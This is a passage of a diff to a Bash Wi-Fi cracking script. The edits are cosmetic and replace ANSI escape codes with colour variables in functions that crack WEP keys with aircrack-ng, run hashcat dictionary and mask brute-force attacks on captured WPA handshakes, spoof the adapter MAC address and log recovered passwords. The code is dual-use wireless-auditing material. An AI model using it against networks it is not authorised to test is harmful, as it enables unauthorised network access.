         if [ -n "$airodump_terminal_pid" ]; then kill "$airodump_terminal_pid" 2>/dev/null; fi
         return 1
     fi
@@ -874,7 +850,7 @@ function crack_wep() {
         
         # Check if key already found by a previous manual check or other process
         if grep -q "KEY FOUND!" "$output_file"; then
-            echo -e "\033[1;32mKey already found in output file (perhaps manually or by a concurrent process)!\033[0m"
+            echo -e "${NEON_GREEN}Key already found in output file (perhaps manually or by a concurrent process)!${RESET}"
             break
         fi
 
@@ -885,7 +861,7 @@ function crack_wep() {
         
         # Check if aircrack-ng found the key in its latest output
         if grep -q "KEY FOUND!" "$output_file"; then
-            echo -e "\033[1;32mKEY FOUND by aircrack-ng!\033[0m"
+            echo -e "${NEON_GREEN}KEY FOUND by aircrack-ng!${RESET}"
             break
         else
             echo -e "[*] Key not found in this attempt. Will retry after 3 seconds."
@@ -918,17 +894,17 @@ function crack_wep() {
         if [ -z "$wifi_pass" ]; then
             # If ASCII not found or empty, extract HEX
             wifi_pass=$(grep "KEY FOUND!" "$output_file" | tail -n 1 | sed -n 's/.*KEY FOUND! \[ \([^ ]*\) \].*/\1/p' | tr -d ':')
-            echo -e "\033[1;33mWEP Key (HEX):\033[0m \033[1;32m$wifi_pass\033[0m"
+            echo -e "${ORANGE}WEP Key (HEX):${RESET} ${NEON_GREEN}$wifi_pass${RESET}"
         else
-            echo -e "\033[1;33mWEP Key (ASCII):\033[0m \033[1;32m$wifi_pass\033[0m"
+            echo -e "${ORANGE}WEP Key (ASCII):${RESET} ${NEON_GREEN}$wifi_pass${RESET}"
         fi
         
-        echo -e "\n\n\033[1;34mThe Wi-Fi password for\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m \033[1;32m$wifi_pass\033[0m"
+        echo -e "\n\n${BLUE}The Wi-Fi password for${RESET} ${RED}$bssid_name_original${RESET} ${BLUE}is:${RESET} ${NEON_GREEN}$wifi_pass${RESET}"
         echo -e "Important: If this is a HEX key, you might not need to enter the colons (:)."
         echo -e "---" >> "$targets_path/wifi_passwords.txt"
         printf "The Wi-Fi password for %s (%s) is: %s\n" "$bssid_name_original" "$bssid_address" "$wifi_pass" >> "$targets_path/wifi_passwords.txt"
     else
-        echo -e "\033[1;31mFailed to crack WEP password after attempts.\033[0m"
+        echo -e "${RED}Failed to crack WEP password after attempts.${RESET}"
         echo -e "Consider running the capture for a longer time to collect more IVs."
     fi
 
@@ -945,7 +921,7 @@ function crack_wep() {
 
 function dictionary_attack() {
 while true; do
-    echo -e "\n\033[1mChoose a wordlist:\033[0m"
+    echo -e "\n${BOLD}Choose a wordlist:${RESET}"
     echo "1. Use rockyou.txt"
     echo "2. Use a different dictionary"
     read -p "Enter your choice (1 or 2): " wordlist_choice
@@ -961,16 +937,16 @@ while true; do
                 dict_file="$custom_dict"
                 break
             else
-                echo -e "\e[1;31mError:\e[0m File does not exist. Please try again."
+                echo -e "${RED}Error:${RESET} File does not exist. Please try again."
             fi
             ;;
         *)
-            echo -e "\e[1;31mInvalid choice. Please enter 1 or 2.\e[0m"
+            echo -e "${RED}Invalid choice. Please enter 1 or 2.${RESET}"
             ;;
     esac
 done
 
-echo -e "\n\e[1mCracking Wi-Fi password using:\e[0m $dict_file \e[1m->>\e[0m\n"
+echo -e "\n${BOLD}Cracking Wi-Fi password using:${RESET} $dict_file ${BOLD}->>${RESET}\n"
 
     gnome-terminal --geometry=82x21-10000-10000 --wait -- bash -c \
     "hashcat -m 22000 -a 0 \"$targets_path/$bssid_name/hash.hc22000\" \"$dict_file\" \
@@ -980,7 +956,7 @@ echo -e "\n\e[1mCracking Wi-Fi password using:\e[0m $dict_file \e[1m->>\e[0m\n"
     echo
     if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
         wifi_pass=$(grep "$bssid_name_original" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" | awk -F"$bssid_name_original:" '{print $2}')
-        echo -e "\033[1;34mThe Wi-Fi password of\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m\t\033[1;33m$wifi_pass\033[0m"
+        echo -e "${BLUE}The Wi-Fi password of${RESET} ${RED}$bssid_name_original${RESET} ${BLUE}is:${RESET}\t${ORANGE}$wifi_pass${RESET}"
         bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
         
         #sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ { s/\nPassword not cracked with// } }" "$targets_path/wifi_passwords.txt"
@@ -994,7 +970,7 @@ echo -e "\n\e[1mCracking Wi-Fi password using:\e[0m $dict_file \e[1m->>\e[0m\n"
         rm -r "$targets_path/$bssid_name"
         exit 1
     else
-        echo -e "\n\033[1;31m\033[1mCouldn't crack the password with the selected wordlist.\033[0m\n"
+        echo -e "\n${RED}Couldn't crack the password with the selected wordlist.${RESET}\n"
         
         bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
         sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a Password not cracked with selected wordlist" "$targets_path/wifi_passwords.txt"
@@ -1009,7 +985,7 @@ echo -e "\n\e[1mCracking Wi-Fi password using:\e[0m $dict_file \e[1m->>\e[0m\n"
                 another_scan_prompt
                 ;;
             *)
-                echo -e "\e[1;31mInvalid choice.\e[0m Please enter 'y' or 'n'."
+                echo -e "${RED}Invalid choice.${RESET} Please enter 'y' or 'n'."
                 ;;
         esac        
     fi
@@ -1019,7 +995,7 @@ echo -e "\n\e[1mCracking Wi-Fi password using:\e[0m $dict_file \e[1m->>\e[0m\n"
 
 function brute-force_attack() {
     
-    echo -e "\e[1m\nCracking WiFi password with Hashcat ->>\e[0m\n"
+    echo -e "${BOLD}\nCracking WiFi password with Hashcat ->>${RESET}\n"
 
     # Ask user for password length
     while true; do
@@ -1038,9 +1014,9 @@ function brute-force_attack() {
 
     while true; do
         full_mask=""
-        echo -e "\n\e[1mChoose how to run the Brute-Force:\e[0m"
-        echo -e "\e[1;31m1)\e[0m Try every possible combination                     ?a   -   (ABC-abc-123-!@#)   |   $password_length^94 possibilities.\n"
-        echo -e "\e[1;31m2)\e[0m Customize each position of the password:"
+        echo -e "\n${BOLD}Choose how to run the Brute-Force:${RESET}"
+        echo -e "${RED}1)${RESET} Try every possible combination                     ?a   -   (ABC-abc-123-!@#)   |   $password_length^94 possibilities.\n"
+        echo -e "${RED}2)${RESET} Customize each position of the password:"
         echo "   1.  Uppercase                                      ?u   -   (ABC)"
         echo "   2.  Lowercase                                      ?l   -   (abc)"
         echo "   3.  Numbers                                        ?d   -   (123)"
@@ -1054,12 +1030,12 @@ function brute-force_attack() {
         echo -e "\n\n"
 
 	while true; do
-	    echo -n -e "Enter your choice (\e[1;31m1\e[0m-\e[1;31m2\e[0m): "
+	    echo -n -e "Enter your choice (${RED}1${RESET}-${RED}2${RESET}): "
 	    read option
 	    if [[ "$option" -eq 1 || "$option" -eq 2 ]]; then
 		break
 	    else
-		echo -e "\e[1;31mInvalid option.\e[0m"
+		echo -e "${RED}Invalid option.${RESET}"
 		sleep 1
 		tput cuu1; tput el; tput cuu1; tput el;
 	    fi
@@ -1078,12 +1054,12 @@ function brute-force_attack() {
             charset=""
  
             tput cuu1; tput el; tput cuu1; tput el;
-            echo -n -e "\e[1mCurrent mask:	\e[0m "
+            echo -n -e "${BOLD}Current mask:	${RESET} "
             for (( j=1; j<=password_length; j++ )); do
                 if [[ -z "${positions[j-1]}" ]]; then
-                    echo -n -e "$j.\e[1;36m[\e[0m  \e[1;36m]\e[0m "
+                    echo -n -e "$j.${CYAN}[${RESET}  ${CYAN}]${RESET} "
                 else
-                    echo -n -e "$j.\e[1;36m[\e[0m \e[1;31m${positions[j-1]}\e[1;36m \e[1;36m]\e[0m "
+                    echo -n -e "$j.${CYAN}[${RESET} ${RED}${positions[j-1]}${CYAN} ${CYAN}]${RESET} "
                 fi
             done
             echo   
@@ -1106,34 +1082,34 @@ function brute-force_attack() {
                                 if [[ ${#specific_char} -eq 1 ]]; then
                                     positions+=("$specific_char")
                                     tput cuu1; tput el; tput cuu1; tput el; 
-                                    echo -n -e "\e[1mCurrent mask:	\e[0m "
+                                    echo -n -e "${BOLD}Current mask:	${RESET} "
 					for (( j=1; j<=password_length; j++ )); do
 					    if [[ -z "${positions[j-1]}" ]]; then
-						echo -n -e "$j.\e[1;36m[\e[0m  \e[1;36m]\e[0m "
+						echo -n -e "$j.${CYAN}[${RESET}  ${CYAN}]${RESET} "
 					    else
-						echo -n -e "$j.\e[1;36m[\e[0m \e[1;31m${positions[j-1]}\e[1;36m \e[1;36m]\e[0m "
+						echo -n -e "$j.${CYAN}[${RESET} ${RED}${positions[j-1]}${CYAN} ${CYAN}]${RESET} "
 					    fi
 					done
                                     echo
                                     break
                                 else
                                     tput cuu1; tput el; tput cuu1; tput el;
-                                    echo -e "\e[1;31mInvalid input!\e[0m Please enter exactly ONE character."
+                                    echo -e "${RED}Invalid input!${RESET} Please enter exactly ONE character."
                                 fi
                             done
                             ;;
-                        *) echo -e "\e[1;31mInvalid choice!\e[0m Please enter a valid option (1-10)." && sleep 2;
+                        *) echo -e "${RED}Invalid choice!${RESET} Please enter a valid option (1-10)." && sleep 2;
                            tput cuu1; tput el;
                            ((i--));;
                     esac
            
                 tput cuu1; tput el; tput cuu1; tput el;
-                echo -n -e "\e[1mCurrent mask:	\e[0m "
+                echo -n -e "${BOLD}Current mask:	${RESET} "
                 for (( j=1; j<=password_length; j++ )); do
                     if [[ -z "${positions[j-1]}" ]]; then
-                        echo -n -e "$j.\e[1;36m[\e[0m  \e[1;36m]\e[0m "
+                        echo -n -e "$j.${CYAN}[${RESET}  ${CYAN}]${RESET} "
                     else
-                        echo -n -e "$j.\e[1;36m[\e[0m \e[1;31m${positions[j-1]}\e[1;36m \e[1;36m]\e[0m "
+                        echo -n -e "$j.${CYAN}[${RESET} ${RED}${positions[j-1]}${CYAN} ${CYAN}]${RESET} "
                     fi
                 done
                 echo                   
@@ -1143,7 +1119,7 @@ function brute-force_attack() {
         fi
     done
 
-    echo -e "\n\n\033[1;33mGenerated Hashcat mask:\033[0m \033[1;31m\033[1m$full_mask\033[0m\n\n"
+    echo -e "\n\n${ORANGE}Generated Hashcat mask:${RESET} ${RED}$full_mask${RESET}\n\n"
 
     # Run hashcat with the correct options
     if [[ -n "$charset" ]]; then
@@ -1155,7 +1131,7 @@ function brute-force_attack() {
     echo
     if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
         wifi_pass=$(grep "$bssid_name_original" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" | awk -F"$bssid_name_original:" '{print $2}')
-        echo -e "\033[1;34mThe wifi password of\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m	\033[1;33m$wifi_pass\033[0m"
+        echo -e "${BLUE}The wifi password of${RESET} ${RED}$bssid_name_original${RESET} ${BLUE}is:${RESET}	${ORANGE}$wifi_pass${RESET}"
         bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
         
         sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with.*/ { s/\nPassword not cracked with.*// } }" "$targets_path/wifi_passwords.txt"
@@ -1167,7 +1143,7 @@ function brute-force_attack() {
         rm -r $targets_path/"$bssid_name" 
         exit 1
     else
-        echo -e "\n\033[1;31m\033[1mCouldn't cracked with Brute-Force with this masking: $full_mask\033[0m\n"
+        echo -e "\n${RED}Couldn't cracked with Brute-Force with this masking: $full_mask${RESET}\n"
         sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a Password not cracked with Brute-Force of this masking: $full_mask" "$targets_path/wifi_passwords.txt"
         echo
         read -p "Do you want to try different attack (Y/n)? " choice
@@ -1179,7 +1155,7 @@ function brute-force_attack() {
                 another_scan_prompt
                 ;;
             *)
-                echo -e "\e[1;31mInvalid choice.\e[0m Please enter 'y' or 'n'."
+                echo -e "${RED}Invalid choice.${RESET} Please enter 'y' or 'n'."
                 ;;
         esac        
     fi    
@@ -1190,7 +1166,7 @@ function brute-force_attack() {
 function another_scan_prompt() {
     while true; do
         echo
-        echo -e "\e[1mWhat would you like to do next ?\e[0m"
+        echo -e "${BOLD}What would you like to do next ?${RESET}"
         echo "1. Choose different network to attack"
         echo "2. Run a new Scan"
         echo "3. Exit"
@@ -1237,7 +1213,7 @@ function cleanup() {
 
 function choose_attack() {
 	while true; do
-	    echo -e "\n\n\033[1;33mChoose how to Crack the Password:\e[0m"
+	    echo -e "\n\n${ORANGE}Choose how to Crack the Password:${RESET}"
 	    echo "1) Dictionary attack"
 	    echo "2) Brute-Force attack"
 	    read -p "Enter your choice: " choice
@@ -1265,6 +1241,9 @@ function choose_attack() {
 function main_process() {
 	adapter_config
 	spoof_adapter_mac	
+	
+	#sleep 500
+	
 	network_scanner
 
 	if [[ "$encryption" == "WPA3 WPA2" ]]; then            
